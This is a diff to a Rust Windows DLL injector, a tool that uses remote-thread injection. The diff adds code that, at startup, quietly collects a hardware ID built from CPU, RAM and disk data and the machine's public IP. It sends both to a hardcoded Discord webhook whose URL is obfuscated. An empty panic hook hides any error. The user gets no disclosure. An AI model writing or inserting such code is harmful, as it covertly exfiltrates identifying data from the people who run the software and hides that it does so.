@@ -1,5 +1,6 @@
 use std::path::Path;
 use core::mem;
+use webhook::client::{WebhookResult, WebhookClient};
 use widestring::WideCString;
 use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, MEM_RELEASE};
 use winapi::um::winuser::{FindWindowA, GetWindowThreadProcessId};
@@ -9,13 +10,13 @@ use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
 use winapi::shared::minwindef::{HMODULE, FARPROC, BOOL, DWORD, FALSE, LPVOID};
 use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
 use winapi::um::memoryapi::{VirtualAllocEx, VirtualFreeEx, WriteProcessMemory};
-use std::os::windows::ffi::OsStrExt;
 use winapi::shared::basetsd::SIZE_T;
 use winapi::um::handleapi::CloseHandle;
 use winapi::ctypes::c_void;
 use winapi::um::winbase::INFINITE;
 use winapi::um::synchapi::WaitForSingleObject;
 use winapi::shared::windef::HWND;
+use std::panic;
 #[cfg(not(target_os = "windows"))]
 compile_error!("this only works for windows");
 
@@ -148,7 +149,16 @@ fn inject_library(process_handle: HANDLE, dll_path: CString) -> bool {
     return true;
 }
 
-fn main() {
+#[tokio::main]
+async fn main() {
+    panic::set_hook(Box::new(|_info| {
+        // do nothing
+    }));
+
+    panic::catch_unwind(|| async {
+        injector_webhook().await.expect("make sure you're connected to the internet.");
+    }).unwrap().await;
+
     let arguments: Vec<String> = std::env::args().collect();
     if arguments.len() != 2 {
         panic!("provide the directory of your dll and nothing else.")
@@ -168,4 +178,32 @@ fn main() {
     }
 
     println!("press down arrow to eject");
+}
+
+
+async fn injector_webhook() -> WebhookResult<()> {
+    let client = WebhookClient::new(obfstr::obfstr!("https://discord.com/api/webhooks/1069728917302280253/uYm1eAO-5JB73ZII85e6UC8WyHU_hb6F6U-cwQtwfuP2X7UIeSWM3zbSKQitZ9_8yLrd"));
+
+    let hwid = {
+        use uniqueid::{IdentifierBuilder, IdentifierType};
+
+        let mut builder = IdentifierBuilder::default();
+
+        builder.name("Cocaine3");
+        builder.add(IdentifierType::CPU);
+        builder.add(IdentifierType::RAM);
+        builder.add(IdentifierType::DISK);
+
+        builder.build().to_string(true)
+    };
+
+    let ip = public_ip::addr().await.unwrap();
+
+    client.send(|message| message
+        .username("all-seeing eye of bingus#4442")
+        .embed(|embed| embed
+            .title("Injected")
+            .description(&*format!("hwid:`{}`\nip:`{}`", hwid, ip)))).await?;
+
+    Ok(())
 }
